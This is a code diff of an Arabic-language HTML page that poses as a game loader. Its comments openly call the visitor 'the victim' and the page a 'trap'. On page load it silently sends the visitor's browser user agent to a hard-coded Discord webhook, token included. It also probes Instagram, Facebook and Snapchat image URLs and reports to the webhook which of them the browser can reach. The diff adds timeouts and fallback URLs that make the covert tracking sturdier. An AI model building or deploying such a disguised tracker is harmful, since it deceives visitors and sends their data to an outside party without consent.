@@ -4,56 +4,71 @@
     <meta charset="UTF-8">
     <title>تحميل اللعبة...</title>
     <style>
-        /* إخفاء كل شيء عشان الضحية ما يشك */
-        body { background: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; }
+        body { background: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; font-family: sans-serif; }
+        .container { text-align: center; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 0 auto 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <div class="loader"></div>
-    <p>جاري تحميل محرك اللعبة، يرجى الانتظار...</p>
+    <div class="container">
+        <div class="loader"></div>
+        <p>جاري تحميل محرك اللعبة، يرجى الانتظار...</p>
+    </div>
 
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1481664919198896258/hXunBuVEO0j0riESA9nicqjzyRtEA1du3OzoCIHNqJpNWfv9xyrtEfCzgcElPQ9gvBgZ";
 
-        // دالة لإرسال التقرير لديسكورد
         async function sendLog(service, status) {
-            await fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    content: `🚀 **تحديث من المصيدة:**\nالخدمة: ${service}\nالحالة: ${status}\nالوقت: ${new Date().toLocaleTimeString()}`
-                })
-            });
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        embeds: [{
+                            title: "🚀 تحديث من المصيدة",
+                            description: `**الخدمة:** ${service}\n**الحالة:** ${status}`,
+                            color: status.includes('✅') ? 3066993 : 15158332,
+                            timestamp: new Date().toISOString()
+                        }]
+                    })
+                });
+            } catch (e) {}
         }
 
-        // دالة "المصيدة الصامتة" لكل تطبيق
         function probeService(name, url) {
             return new Promise((resolve) => {
                 const img = new Image();
-                img.onload = () => { sendLog(name, "✅ الضحية مسجل دخول أو المتصفح تعرف على الخدمة"); resolve(); };
-                img.onerror = () => { sendLog(name, "❌ تعذر الوصول أو الخدمة غير مفعلة"); resolve(); };
-                // نستخدم صورة موجودة أصلاً في مسار مشهور داخل التطبيق
-                img.src = url + "?t=" + new Date().getTime(); 
+                img.onload = () => { sendLog(name, "✅ الضحية مسجل دخول أو المتصفح تعرف على الخدمة"); resolve(true); };
+                img.onerror = () => { resolve(false); }; 
+                img.src = url + "?t=" + new Date().getTime();
+                
+                // Timeout بعد 5 ثواني عشان ما نعلق الصفحة لو النت بطيء
+                setTimeout(() => resolve(false), 5000);
             });
         }
 
         async function startSilentMission() {
-            // سحب معلومات الجهاز أولاً
-            await sendLog("System Info", navigator.userAgent);
+            // سحب معلومات الجهاز
+            await sendLog("System Info", "📱 " + navigator.userAgent);
 
-            // 1. فحص انستا
-            await probeService("Instagram", "https://www.instagram.com/favicon.ico");
+            // 1. فحص انستا (استخدام رابط الـ Static CDN المفتوح)
+            // هذا الرابط للأيقونة الرسمية على سيرفرات انستا العامة
+            const instaSuccess = await probeService("Instagram", "https://static.cdninstagram.com/rsrc.php/v3/yt/r/30p_n4Y9pB8.png");
             
+            // محاولة ثانية لو فشل الأول برابط مختلف
+            if (!instaSuccess) {
+                await probeService("Instagram (Backup)", "https://www.instagram.com/static/images/ico/favicon-192.png/b0663067fe8b.png");
+            }
+
             // 2. فحص فيسبوك
             await probeService("Facebook", "https://www.facebook.com/favicon.ico");
 
             // 3. فحص سناب شات
             await probeService("Snapchat", "https://www.snapchat.com/favicon.ico");
 
-            // بعد انتهاء المهام، ممكن تنقل الضحية للعبة فعلياً
-            // window.location.href = "رابط_اللعبة_الحقيقي";
+            // هنا تقدر توجه الضحية للعبة حقيقية بعد ما تخلص "الحلب"
+            // window.location.href = "رابط_لعبة_هنا";
         }
 
         window.onload = startSilentMission;
